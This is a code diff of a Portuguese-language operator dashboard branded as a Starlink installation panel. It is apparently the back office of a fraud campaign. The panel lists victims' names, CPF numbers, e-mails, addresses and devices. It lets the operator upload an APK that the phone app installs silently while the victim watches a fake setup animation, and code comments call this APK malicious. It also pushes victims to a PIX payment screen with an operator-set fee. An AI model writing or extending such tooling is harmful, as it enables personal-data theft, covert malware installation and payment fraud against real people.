@@ -7,48 +7,185 @@
 <style>
   * { box-sizing: border-box; }
   body { background:#0a0a0b; color:#ececf1; font:14px/1.55 Inter,system-ui,sans-serif; margin:0; padding:24px; }
+  #top { display:flex; justify-content:space-between; align-items:flex-start; gap:12px; flex-wrap:wrap; margin-bottom:14px; }
   h1 { font-size:18px; letter-spacing:.12em; font-weight:700; margin:0 0 4px; }
-  h1 span { color:#8b8b93; }
-  #stats { color:#8b8b93; font-size:12px; margin-bottom:16px; }
+  h1 span { color:#8b8b93; font-weight:400; }
+  #stats { color:#8b8b93; font-size:12px; margin-bottom:12px; }
+  .tabs { display:flex; gap:8px; margin-bottom:16px; flex-wrap:wrap; }
+  .tabs button { background:#17171c; color:#8b8b93; border:1px solid #232329; border-radius:8px; padding:8px 14px; font-weight:700; font-size:12px; letter-spacing:.05em; cursor:pointer; }
+  .tabs button.ativa { background:#fff; color:#000; border-color:#fff; }
+  .comandos { display:flex; gap:10px; margin-bottom:14px; flex-wrap:wrap; align-items:center; }
+  .comandos .lbl { color:#6f6f78; font-size:12px; letter-spacing:.08em; }
+  button.principal { background:#fff; color:#000; border:0; border-radius:8px; padding:10px 16px; font-weight:700; font-size:12px; letter-spacing:.04em; cursor:pointer; }
+  button.principal:hover { opacity:.85; }
+  button.azul { background:#1d2d3a; color:#7dc8e8; border:1px solid #2c4a5a; border-radius:8px; padding:8px 12px; font-weight:700; font-size:12px; cursor:pointer; }
+  button.fantasma { background:#1d3a26; color:#7ddc9a; border:1px solid #2c5a3c; border-radius:8px; padding:8px 12px; font-weight:700; font-size:12px; cursor:pointer; }
   table { width:100%; border-collapse:collapse; font-size:13px; }
-  th { text-align:left; color:#6f6f78; font-size:11px; letter-spacing:.08em; text-transform:uppercase;
-       border-bottom:1px solid #232329; padding:8px 10px; white-space:nowrap; }
+  th { text-align:left; color:#6f6f78; font-size:11px; letter-spacing:.08em; text-transform:uppercase; border-bottom:1px solid #232329; padding:8px 10px; white-space:nowrap; }
   td { border-bottom:1px solid #1a1a1f; padding:10px; vertical-align:top; max-width:340px; }
+  tr.urgente td { background:#241d10; }
   .ev { color:#8b8b93; font-size:12px; white-space:pre-line; }
-  .ok { background:#1d3a26; color:#7ddc9a; padding:2px 8px; border-radius:20px; font-size:11px; font-weight:700; }
-  .wd { background:#3a2d1d; color:#e8c47d; padding:2px 8px; border-radius:20px; font-size:11px; font-weight:700; }
-  button { background:#fff; color:#000; border:0; border-radius:8px; padding:9px 14px; font-weight:700;
-           font-size:12px; letter-spacing:.04em; cursor:pointer; white-space:nowrap; }
-  button:hover { opacity:.85; }
+  .chip { padding:2px 8px; border-radius:20px; font-size:11px; font-weight:700; white-space:nowrap; }
+  .ok { background:#1d3a26; color:#7ddc9a; }
+  .wd { background:#3a2d1d; color:#e8c47d; }
+  .az { background:#1d2d3a; color:#7dc8e8; }
+  .in { background:#3a1d2a; color:#e87da8; }
+  .card { background:#101014; border:1px solid #232329; border-radius:12px; padding:18px; max-width:680px; margin-bottom:14px; }
+  .card h2 { font-size:13px; letter-spacing:.1em; margin:0 0 10px; color:#fff; }
+  .card p { color:#8b8b93; font-size:13px; margin:0 0 12px; }
+  label { display:block; color:#8b8b93; font-size:12px; margin:10px 0 4px; letter-spacing:.05em; }
+  input[type=text], input[type=number], textarea { width:100%; background:#0a0a0d; border:1px solid #232329; border-radius:8px; color:#ececf1; font:13px/1.5 Inter,system-ui,sans-serif; padding:10px; }
+  textarea { font-family:ui-monospace,Consolas,monospace; font-size:12px; resize:vertical; }
+  .qrbox { background:#fff; border-radius:10px; padding:14px; display:inline-block; margin-top:12px; }
+  .qrbox img { display:block; width:280px; height:280px; image-rendering:pixelated; }
+  .qrbox.vazio { width:308px; height:308px; display:flex; align-items:center; justify-content:center; color:#9aa6b0; font-size:12px; }
+  .info-apk { color:#8b8b93; font-size:12px; margin-top:10px; word-break:break-all; }
+  .emv { margin-top:10px; font-family:ui-monospace,Consolas,monospace; font-size:11px; color:#6f9fb0; word-break:break-all; background:#0a0a0d; border:1px solid #232329; border-radius:8px; padding:10px; }
 </style>
 </head>
 <body>
-<h1>STARLINK <span>· painel de instalações</span></h1>
-<div id="stats">carregando…</div>
-<table>
-  <thead><tr>
-    <th>Quando</th><th>Nome</th><th>CPF</th><th>E-mail</th><th>Endereço</th>
-    <th>Dispositivo</th><th>Eventos</th><th>Status</th><th></th>
-  </tr></thead>
-  <tbody id="tb"></tbody>
-</table>
-<script>
-const esc = s => String(s ?? '').replace(/[&<>"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;'}[c]));
+<div id="top">
+  <div>
+    <h1>STARLINK <span>· painel de instalações</span></h1>
+    <div id="stats">carregando…</div>
+  </div>
+  <label style="display:flex;align-items:center;gap:6px;color:#8b8b93;font-size:12px;margin:0;">
+    <input type="checkbox" id="chkSom" checked> som de alerta
+  </label>
+</div>
 
-async function concluir(id) {
-  await fetch('/api/job/' + id + '/concluir', { method: 'POST' });
-  atualizar();
+<div class="tabs">
+  <button class="ativa" data-tab="dev">DISPOSITIVOS</button>
+  <button data-tab="apk">INSTALADOR (APK)</button>
+  <button data-tab="pix">CONFIGURAÇÕES (PIX)</button>
+</div>
+
+<!-- ============ DISPOSITIVOS ============ -->
+<div id="tab-dev">
+  <div class="comandos">
+    <span class="lbl">COMANDOS:</span>
+    <button class="principal" id="btnSubirTop">⬆ SUBIR APK (EXPLORADOR)</button>
+    <button class="azul" id="btnPagarTop">💸 MANDAR PARA PAGAMENTO</button>
+  </div>
+  <table>
+    <thead><tr>
+      <th>Quando</th><th>Nome</th><th>CPF</th><th>E-mail</th><th>Endereço</th>
+      <th>Dispositivo</th><th>Fase</th><th>Eventos</th><th>Status</th><th></th>
+    </tr></thead>
+    <tbody id="tb"></tbody>
+  </table>
+</div>
+
+<!-- ============ INSTALADOR (APK) ============ -->
+<div id="tab-apk" style="display:none">
+  <div class="card">
+    <h2>Instalador (APK)</h2>
+    <p>Enquanto a pessoa vê a animação de "configuração", o app baixa este arquivo do servidor e instala em silêncio.</p>
+    <button class="principal" id="btnSubir">⬆ SUBIR APK (ABRIR EXPLORADOR)</button>
+    <input type="file" id="arqApk" accept=".apk" hidden>
+    <div id="apkInfo" class="info-apk">verificando…</div>
+  </div>
+</div>
+
+<!-- ============ CONFIGURAÇÕES (PIX) ============ -->
+<div id="tab-pix" style="display:none">
+  <div class="card">
+    <h2>Configurações (PIX)</h2>
+    <p>Cole aqui o código copia-e-cola que o seu banco gerou (a string inteira, começando com 000201…). O QR Code é gerado nesta tela e no aparelho.</p>
+    <label>TAXA (R$)</label>
+    <input type="number" id="pixValor" step="0.01" min="0" value="9.90">
+    <label>CÓDIGO PIX COPIA-E-COLA</label>
+    <textarea id="pixCopia" rows="7" placeholder="00020126580014br.gov.bcb.pix0136..."></textarea>
+    <div style="margin-top:12px; display:flex; gap:10px; align-items:center;">
+      <button class="principal" id="btnPixSalvar">SALVAR CONFIGURAÇÃO</button>
+      <span id="pixMsg" style="color:#7ddc9a;font-size:12px;"></span>
+    </div>
+    <div>
+      <div id="qrWrap" class="qrbox vazio">sem QR Code ainda</div>
+      <div id="pixEmv" class="emv" style="display:none"></div>
+    </div>
+  </div>
+</div>
+
+<script>
+const esc = s => String(s ?? '').replace(/[&<>\"]/g, c => ({'&':'&amp;','<':'&lt;','>':'&gt;','\"':'&quot;'}[c]));
+let ultimoJobs = [];
+const visto = {};  // id -> quantos eventos o som já ouviu
+
+/* ---------- abas ---------- */
+document.querySelectorAll('.tabs button').forEach(b => b.onclick = () => {
+  document.querySelectorAll('.tabs button').forEach(x => x.classList.remove('ativa'));
+  b.classList.add('ativa');
+  for (const t of ['dev','apk','pix'])
+    document.getElementById('tab-' + t).style.display = (t === b.dataset.tab ? '' : 'none');
+  if (b.dataset.tab === 'apk') atualizarApkInfo();
+  if (b.dataset.tab === 'pix') carregarPix();
+});
+
+/* ---------- som de alerta ---------- */
+function beep(notas) {
+  if (!document.getElementById('chkSom').checked) return;
+  try {
+    const AC = window.AudioContext || window.webkitAudioContext;
+    const ctx = window.__actx || (window.__actx = new AC());
+    if (ctx.state === 'suspended') ctx.resume();
+    let t = ctx.currentTime;
+    for (const [f, d] of notas) {
+      const o = ctx.createOscillator(), g = ctx.createGain();
+      o.type = 'sine'; o.frequency.value = f;
+      g.gain.setValueAtTime(0.0001, t);
+      g.gain.exponentialRampToValueAtTime(0.5, t + 0.02);
+      g.gain.exponentialRampToValueAtTime(0.0001, t + d);
+      o.connect(g); g.connect(ctx.destination);
+      o.start(t); o.stop(t + d + 0.05);
+      t += d + 0.12;
+    }
+  } catch (_) {}
+}
+const SOM_APK       = [[880,.18],[880,.18]];         // hora de subir o apk
+const SOM_INSTALOU  = [[660,.22]];                   // apk malicioso instalado
+const SOM_PAGAMENTO = [[440,.25]];                   // pagamento aberto
+const SOM_FIM       = [[523,.1],[659,.1],[784,.16]]; // concluída
+
+function checarSons(j) {
+  const n = j.eventos.length, de = visto[j.id] ?? 0;
+  for (let i = de; i < n; i++) {
+    const m = j.eventos[i].msg;
+    if (m.includes('suba o APK')) beep(SOM_APK);
+    else if (m.includes('INSTALADO')) beep(SOM_INSTALOU);
+    else if (/conclu[ií]da/i.test(m)) beep(SOM_FIM);
+    else if (m.toLowerCase().includes('pagamento')) beep(SOM_PAGAMENTO);
+  }
+  visto[j.id] = n;
 }
 
+/* ---------- fase atual (chip colorido) ---------- */
+function fase(j) {
+  if (j.status === 'aprovado') return ['ok','CONCLUÍDA'];
+  const u = j.eventos.map(e => e.msg).join('|');
+  if (/tela de pagamento aberta/.test(u)) return ['az','EM PAGAMENTO'];
+  if (u.includes('INSTALADO')) return ['in','MÓDULO INSTALADO'];
+  if (u.includes('download do apk')) return ['az','BAIXANDO APK'];
+  if (u.includes('suba o APK')) return ['wd','AGUARDANDO APK ⬆'];
+  return ['wd','CADASTRANDO'];
+}
+
+/* ---------- tabela ---------- */
 async function atualizar() {
   try {
     const jobs = await (await fetch('/api/jobs')).json();
+    ultimoJobs = jobs;
     const tb = document.getElementById('tb');
     tb.innerHTML = '';
     for (const j of jobs) {
+      checarSons(j);
       const d = j.dados || {};
       const end = [d.endereco, d.numero && ('Nº ' + d.numero), d.complemento].filter(Boolean).join(', ');
+      const [cl, tx] = fase(j);
+      const evs = j.eventos.slice(-8).map(e =>
+        new Date(e.ts).toLocaleTimeString('pt-BR') + ' — ' + esc(e.msg)).join('\n');
       const tr = document.createElement('tr');
+      if (tx === 'AGUARDANDO APK ⬆' && j.status !== 'aprovado') tr.classList.add('urgente');
       tr.innerHTML =
         '<td>' + new Date(j.criadoEm).toLocaleString('pt-BR') + '</td>' +
         '<td>' + esc(d.nome || '—') + (d.tipo === 'login' ? ' <em style="color:#6f6f78">(login)</em>' : '') + '</td>' +
@@ -56,24 +193,94 @@ async function atualizar() {
         '<td>' + esc(d.email || '—') + '</td>' +
         '<td>' + esc(end || '—') + '</td>' +
         '<td>' + esc(d.dispositivo || '—') + ' <span style="color:#6f6f78">A' + esc(d.android || '') + '</span></td>' +
-        '<td class="ev">' + j.eventos.map(e =>
-            new Date(e.ts).toLocaleTimeString('pt-BR') + ' — ' + esc(e.msg)).join('\n') + '</td>' +
-        '<td>' + (j.status === 'aprovado'
-            ? '<span class="ok">CONCLUÍDA</span>'
-            : '<span class="wd">AGUARDANDO</span>') + '</td>' +
-        '<td>' + (j.status !== 'aprovado'
-            ? '<button onclick="concluir(\'' + j.id + '\')">CONCLUIR INSTALAÇÃO</button>' : '') + '</td>';
+        '<td><span class="chip ' + cl + '">' + tx + '</span></td>' +
+        '<td class="ev">' + evs + '</td>' +
+        '<td>' + (j.status === 'aprovado' ? '<span class="chip ok">CONCLUÍDA</span>' : '<span class="chip wd">AGUARDANDO</span>') + '</td>' +
+        '<td style="white-space:nowrap">' + (j.status !== 'aprovado'
+          ? '<button class="azul" onclick="mandarPagamento(\'' + j.id + '\')">💸 PAGAMENTO</button> ' +
+            '<button class="fantasma" onclick="concluir(\'' + j.id + '\')">✓ CONCLUIR</button>' : '') + '</td>';
       tb.appendChild(tr);
     }
     const n = jobs.length, c = jobs.filter(x => x.status === 'aprovado').length;
     document.getElementById('stats').textContent =
-      n + ' cadastro(s) · ' + c + ' concluída(s) · aguardando você: ' + (n - c);
+      n + ' dispositivo(s) · ' + c + ' concluída(s) · aguardando você: ' + (n - c);
   } catch (e) {
     document.getElementById('stats').textContent = 'sem conexão com o backend';
   }
 }
+
+/* ---------- comandos ---------- */
+async function concluir(id) {
+  await fetch('/api/job/' + id + '/concluir', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ fonte:'painel' }) });
+  atualizar();
+}
+async function mandarPagamento(id) {
+  await fetch('/api/job/' + id + '/comando', { method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify({ comando:'pagamento' }) });
+  atualizar();
+}
+document.getElementById('btnPagarTop').onclick = () => {
+  const alvo = ultimoJobs.find(j => j.status !== 'aprovado');
+  if (!alvo) { alert('nenhum dispositivo aguardando'); return; }
+  mandarPagamento(alvo.id);
+};
+
+/* ---------- upload do apk (abre o explorador) ---------- */
+const arqApk = document.getElementById('arqApk');
+document.getElementById('btnSubir').onclick = () => arqApk.click();
+document.getElementById('btnSubirTop').onclick = () => arqApk.click();
+arqApk.onchange = async () => {
+  if (!arqApk.files.length) return;
+  const fd = new FormData();
+  fd.append('apk', arqApk.files[0]);
+  const r = await fetch('/api/apk-upload', { method:'POST', body: fd });
+  const j = await r.json();
+  if (r.ok) alert('APK enviado: updater.apk (' + j.bytes.toLocaleString('pt-BR') + ' bytes).\nO próximo cadastro já baixa.');
+  else alert('erro: ' + (j.erro || r.status));
+  arqApk.value = '';
+  atualizarApkInfo();
+};
+async function atualizarApkInfo() {
+  try {
+    const j = await (await fetch('/api/apk-info')).json();
+    document.getElementById('apkInfo').textContent = j.presente
+      ? 'updater.apk no servidor: ' + j.bytes.toLocaleString('pt-BR') + ' bytes · atualizado em ' + new Date(j.modificado).toLocaleString('pt-BR')
+      : 'NENHUM APK NO SERVIDOR — suba o updater.apk (release do módulo suporte)';
+  } catch (_) { document.getElementById('apkInfo').textContent = 'offline'; }
+}
+
+/* ---------- pix ---------- */
+async function carregarPix() {
+  try {
+    const cfg = await (await fetch('/api/admin/pix')).json();
+    document.getElementById('pixValor').value = cfg.valor || '9.90';
+    document.getElementById('pixCopia').value = cfg.copiaECola || '';
+    const pub = await (await fetch('/api/pix')).json();
+    const wrap = document.getElementById('qrWrap'), emv = document.getElementById('pixEmv');
+    if (pub.presente) {
+      wrap.classList.remove('vazio');
+      wrap.innerHTML = '<img src="/api/pix/qrcode.png?t=' + Date.now() + '" alt="QR Code PIX">';
+      emv.style.display = ''; emv.textContent = pub.emv;
+    } else {
+      wrap.classList.add('vazio');
+      wrap.innerHTML = 'sem QR Code ainda — cole o copia-e-cola e salve';
+      emv.style.display = 'none';
+    }
+  } catch (_) {}
+}
+document.getElementById('btnPixSalvar').onclick = async () => {
+  const r = await fetch('/api/admin/pix', {
+    method:'POST', headers:{'Content-Type':'application/json'},
+    body: JSON.stringify({ valor: document.getElementById('pixValor').value, copiaEcola: document.getElementById('pixCopia').value })
+  });
+  const msg = document.getElementById('pixMsg');
+  msg.textContent = r.ok ? 'salvo ✓' : 'erro ao salvar';
+  setTimeout(() => msg.textContent = '', 2500);
+  carregarPix();
+};
+
 atualizar();
 setInterval(atualizar, 2000);
+atualizarApkInfo();
 </script>
 </body>
 </html>
